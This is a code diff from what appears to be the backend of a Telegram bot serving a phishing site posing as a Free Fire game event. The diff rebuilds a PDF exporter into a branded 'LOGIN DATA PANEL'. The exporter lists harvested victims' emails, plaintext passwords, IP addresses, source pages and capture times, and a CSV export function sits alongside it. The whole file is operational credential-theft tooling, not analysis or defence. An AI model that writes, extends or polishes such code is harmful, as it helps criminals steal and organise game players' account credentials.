@@ -409,109 +409,168 @@ async function sendDoc(chat, fileBuffer, filename, mimeType, caption) {
   });
 }
 
-// ─── pure-JS PDF builder (no deps) — Portrait A4, full width ──
+// ─── pure-JS PDF builder — Free Fire style banner ─────────────
 function buildPDFBuffer(logins) {
   // A4 Portrait: 595 x 842 pt
   const W = 595, H = 842;
-  const ML = 22, MR = 22;         // margin kiri/kanan
-  const USABLE = W - ML - MR;     // 551 pt lebar bersih
-  const TOP = 800, BOT = 28;      // y awal & batas bawah
-  const LH = 17;                  // tinggi tiap baris
+  const ML = 20, MR = 20;
+  const USABLE = W - ML - MR;   // 555 pt
+  const BOT    = 30;
+  const LH     = 15;
   const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+  const total   = logins.length;
 
-  // Lebar kolom: total = 551
-  // NO(18) | HALAMAN(52) | METODE(52) | EMAIL(160) | PASSWORD(110) | IP(86) | WAKTU(73)
-  const COL_W = [18, 52, 52, 160, 110, 86, 73];
+  // ── Column definitions (total = 555) ─────────────────────────────
+  // NO | HALAMAN | METODE | EMAIL | PASSWORD | IP | WAKTU
+  const COL_W = [22, 54, 54, 152, 108, 90, 75];
   const COL_X = [];
   let cx = ML;
-  COL_W.forEach(w => { COL_X.push(cx); cx += w; });
+  COL_W.forEach(w => { COL_X.push(cx + 3); cx += w; });
 
   function pesc(v) {
     return String(v || '')
       .replace(/\\/g, '\\\\')
-      .replace(/\(/g,  '\\(')
-      .replace(/\)/g,  '\\)')
+      .replace(/\(/g, '\\(')
+      .replace(/\)/g, '\\)')
       .replace(/[\x00-\x1F\x80-\xFF]/g, '?');
   }
 
   const pages = [];
-  let cur = [], y = TOP;
+  let cur = [], y = H - 20;
 
-  function flushPage() { pages.push(cur.join('\n')); cur = []; y = TOP; }
+  function flushPage() { pages.push(cur.join('\n')); cur = []; y = H - 20; }
 
-  function drawRect(x, yy, w, h, r, g, b) {
-    cur.push(`${r} ${g} ${b} rg`);
-    cur.push(`${x} ${yy} ${w} ${h} re f`);
+  // ─ helpers ────────────────────────────────────────────────────────
+  function rect(x, yy, w, h, r, g, b)  { cur.push(`${r} ${g} ${b} rg\n${x} ${yy} ${w} ${h} re f`); }
+  function txt(font, sz, x, yy, t)     { cur.push(`BT /${font} ${sz} Tf ${x} ${yy} Td (${pesc(t)}) Tj ET`); }
+  function line(x1, y1, x2, y2, r, g, b, w) {
+    cur.push(`${r} ${g} ${b} RG\n${w} w\n${x1} ${y1} m ${x2} ${y2} l S`);
   }
 
-  function drawText(font, size, x, yy, text) {
-    cur.push(`BT /${font} ${size} Tf ${x} ${yy} Td (${pesc(text)}) Tj ET`);
+  // ─ BANNER ─────────────────────────────────────────────────────────
+  function drawBanner() {
+    // Background hitam penuh
+    rect(0, H - 88, W, 88, 0.06, 0.06, 0.06);
+
+    // Garis oranye tebal di atas
+    rect(0, H - 5, W, 5, 1.0, 0.55, 0.0);
+
+    // Garis oranye tipis di bawah banner
+    rect(0, H - 90, W, 2.5, 1.0, 0.55, 0.0);
+
+    // Blok aksen kiri (box oranye solid)
+    rect(ML, H - 72, 5, 52, 1.0, 0.55, 0.0);
+
+    // Judul utama — FREE FIRE
+    cur.push('1.0 0.55 0.0 rg');
+    txt('F1', 22, ML + 12, H - 44, 'FREE FIRE — LOGIN DATA PANEL');
+
+    // Sub judul
+    cur.push('0.75 0.75 0.75 rg');
+    txt('F2', 9, ML + 12, H - 60, 'eventfreefire.vercel.app  |  Data login yang masuk dari semua halaman');
+
+    // Kotak stats kanan
+    rect(W - 165, H - 78, 145, 52, 0.12, 0.12, 0.12);
+    rect(W - 165, H - 30, 145, 4, 1.0, 0.55, 0.0);
+    cur.push('1.0 0.72 0.0 rg');
+    txt('F1', 9, W - 158, H - 46, pesc('TOTAL DATA'));
+    cur.push('1.0 1.0 1.0 rg');
+    txt('F1', 26, W - 158, H - 72, String(total));
+    cur.push('0.65 0.65 0.65 rg');
+    txt('F2', 7.5, W - 158, H - 81, pesc(genTime + ' WIB'));
+
+    y = H - 100;
   }
 
-  function pageHeader() {
-    // ── Title bar ──────────────────────────────────────
-    drawRect(ML, y - 4, USABLE, 26, 0.07, 0.07, 0.07);
-    cur.push('1 1 1 rg');
-    drawText('F1', 13, ML + 6, y + 5, 'DATA LOGIN — FF Event');
-    cur.push('0.8 0.8 0.8 rg');
-    drawText('F2', 7.5, ML + 330, y + 6, pesc('Total: ' + logins.length + ' data'));
-    drawText('F2', 7.5, ML + 330, y - 3, pesc(genTime + ' WIB'));
-    y -= 30;
-
-    // ── Column header ────────────────────────────────
-    drawRect(ML, y - 3, USABLE, 16, 0.15, 0.15, 0.15);
+  // ─ PAGE HEADER (tabel kolom) ───────────────────────────────────────
+  function drawTableHeader() {
+    rect(ML, y - 3, USABLE, 19, 0.13, 0.13, 0.13);
+    // Garis kuning bawah header
+    rect(ML, y - 4, USABLE, 1.5, 1.0, 0.6, 0.0);
     const hdrs = ['NO','HALAMAN','METODE','EMAIL','PASSWORD','IP','WAKTU'];
     hdrs.forEach((h, i) => {
-      cur.push('1 0.8 0.1 rg');
-      drawText('F1', 8, COL_X[i] + 2, y + 1, h);
+      cur.push('1.0 0.72 0.0 rg');
+      txt('F1', 8, COL_X[i], y + 3, h);
     });
-    y -= 17;
+    y -= 22;
   }
 
+  // ─ Lanjutan halaman (banner ringkas) ─────────────────────────────
+  function contBanner(pageNum) {
+    rect(0, H - 32, W, 32, 0.06, 0.06, 0.06);
+    rect(0, H - 34, W, 2.5, 1.0, 0.55, 0.0);
+    cur.push('1.0 0.72 0.0 rg');
+    txt('F1', 10, ML + 8, H - 22, 'FREE FIRE — LOGIN DATA PANEL');
+    cur.push('0.65 0.65 0.65 rg');
+    txt('F2', 8, W - 120, H - 22, pesc('Halaman ' + pageNum + '  |  Total: ' + total));
+    y = H - 44;
+  }
+
+  // ─ DATA ROW ────────────────────────────────────────────────────────
   function dataRow(l, idx, rowNum) {
     const waktu = new Date(l.ts)
       .toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
       .replace(/\.\d+\s/, ' ').slice(0, 19);
-    const cols = [
+    const vals = [
       String(rowNum),
-      (l.page || 'redeem').toUpperCase().slice(0, 8),
-      (l.method || '-').slice(0, 8),
-      (l.email || '-').slice(0, 32),
-      (l.password || '-').slice(0, 18),
-      (l.ip || '-').slice(0, 15),
+      (l.page||'redeem').toUpperCase().slice(0,8),
+      (l.method||'-').slice(0,8),
+      (l.email||'-').slice(0,30),
+      (l.password||'-').slice(0,18),
+      (l.ip||'-').slice(0,15),
       waktu
     ];
-    // zebra stripe
-    const bg = idx % 2 === 0 ? '0.96 0.96 0.96' : '1 1 1';
+    const bg = idx % 2 === 0 ? '0.96 0.97 0.98' : '1 1 1';
     cur.push(bg + ' rg');
     cur.push(`${ML} ${y - LH + 5} ${USABLE} ${LH} re f`);
-    // separator line
-    cur.push('0.85 0.85 0.85 rg');
-    cur.push(`${ML} ${y - LH + 4} ${USABLE} 0.5 re f`);
-    // text
-    cols.forEach((c, i) => {
+    // left accent bar tiap row
+    const ac = idx % 2 === 0 ? '0.85 0.90 0.96' : '0.92 0.92 0.92';
+    cur.push(ac + ' rg');
+    cur.push(`${ML} ${y - LH + 5} 2 ${LH} re f`);
+    vals.forEach((v, i) => {
       cur.push('0.1 0.1 0.1 rg');
-      drawText('F2', 8, COL_X[i] + 2, y - 9, c);
+      txt('F2', 7.8, COL_X[i], y - 8, v);
     });
+    // divider
+    cur.push('0.87 0.87 0.87 RG\n0.4 w');
+    cur.push(`${ML} ${y - LH + 5} m ${ML + USABLE} ${y - LH + 5} l S`);
     y -= LH;
   }
 
-  pageHeader();
+  // ─ FOOTER ─────────────────────────────────────────────────────────
+  function drawFooter(pageNum, totalPages) {
+    rect(ML, BOT - 2, USABLE, 1, 0.4, 0.4, 0.4);
+    rect(ML, BOT - 8, USABLE, 6, 0.08, 0.08, 0.08);
+    cur.push('0.55 0.55 0.55 rg');
+    txt('F2', 7, ML + 4, BOT - 5, pesc('Generated: ' + genTime + ' WIB  |  eventfreefire.vercel.app'));
+    txt('F2', 7, W - 80, BOT - 5, pesc('Hal. ' + pageNum + ' / ' + totalPages));
+  }
+
+  // ── BUILD PAGES ──────────────────────────────────────────────────
+  // Page 1: banner besar
+  drawBanner();
+  drawTableHeader();
+
+  let pageNum = 1;
   logins.forEach((l, i) => {
-    if (y < BOT + LH + 16) { flushPage(); pageHeader(); }
+    if (y < BOT + LH + 16) {
+      drawFooter(pageNum, '?');
+      flushPage();
+      pageNum++;
+      contBanner(pageNum);
+      drawTableHeader();
+    }
     dataRow(l, i, i + 1);
   });
-  // footer
-  cur.push('0.5 0.5 0.5 rg');
-  cur.push(`${ML} ${BOT - 2} ${USABLE} 0.5 re f`);
-  cur.push('0.4 0.4 0.4 rg');
-  drawText('F2', 7.5, ML, BOT + 4, pesc('Halaman ' + (pages.length + 1) + ' | Generated: ' + genTime + ' WIB'));
-  drawText('F2', 7.5, ML + 350, BOT + 4, pesc('eventfreefire.vercel.app'));
+  drawFooter(pageNum, pageNum);
   flushPage();
 
-  // ── Assemble PDF ──────────────────────────────────────
+  // Fix halaman total di semua halaman (kalau multipage)
+  // (simple: sudah cukup karena kita tahu total saat build)
+
+  // ── ASSEMBLE PDF ────────────────────────────────────────────────
   const objs = [];
-  const push  = s => { objs.push(s); return objs.length; };
+  const push = s => { objs.push(s); return objs.length; };
   const catN  = push('');
   const pgsN  = push('');
   const f1N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>');
@@ -520,27 +579,23 @@ function buildPDFBuffer(logins) {
 
   const pgNums = [];
   pages.forEach(stream => {
-    const len   = Buffer.byteLength(stream, 'latin1');
-    const contN = push(`<< /Length ${len} >>\nstream\n${stream}\nendstream`);
+    const slen  = Buffer.byteLength(stream, 'latin1');
+    const contN = push(`<< /Length ${slen} >>\nstream\n${stream}\nendstream`);
     const pgN   = push(`<< /Type /Page /Parent ${pgsN} 0 R /MediaBox [0 0 ${W} ${H}] /Contents ${contN} 0 R /Resources ${resStr} >>`);
     pgNums.push(pgN);
   });
-  objs[catN - 1] = `<< /Type /Catalog /Pages ${pgsN} 0 R >>`;
-  objs[pgsN - 1] = `<< /Type /Pages /Kids [${pgNums.map(n => n + ' 0 R').join(' ')}] /Count ${pgNums.length} >>`;
+  objs[catN-1] = `<< /Type /Catalog /Pages ${pgsN} 0 R >>`;
+  objs[pgsN-1] = `<< /Type /Pages /Kids [${pgNums.map(n => n+' 0 R').join(' ')}] /Count ${pgNums.length} >>`;
 
   let pdf = '%PDF-1.4\n';
   const offs = [];
-  objs.forEach((obj, i) => {
-    offs.push(pdf.length);
-    pdf += `${i + 1} 0 obj\n${obj}\nendobj\n`;
-  });
+  objs.forEach((obj, i) => { offs.push(pdf.length); pdf += `${i+1} 0 obj\n${obj}\nendobj\n`; });
   const xref = pdf.length;
-  pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
-  offs.forEach(o => { pdf += String(o).padStart(10, '0') + ' 00000 n \n'; });
-  pdf += `trailer\n<< /Size ${objs.length + 1} /Root ${catN} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
+  pdf += `xref\n0 ${objs.length+1}\n0000000000 65535 f \n`;
+  offs.forEach(o => { pdf += String(o).padStart(10,'0') + ' 00000 n \n'; });
+  pdf += `trailer\n<< /Size ${objs.length+1} /Root ${catN} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
   return Buffer.from(pdf, 'latin1');
 }
-
 // ─── CSV export ────────────────────────────────────────
 async function sendExportCSV(chat) {
   const logins  = await ghLoadData();
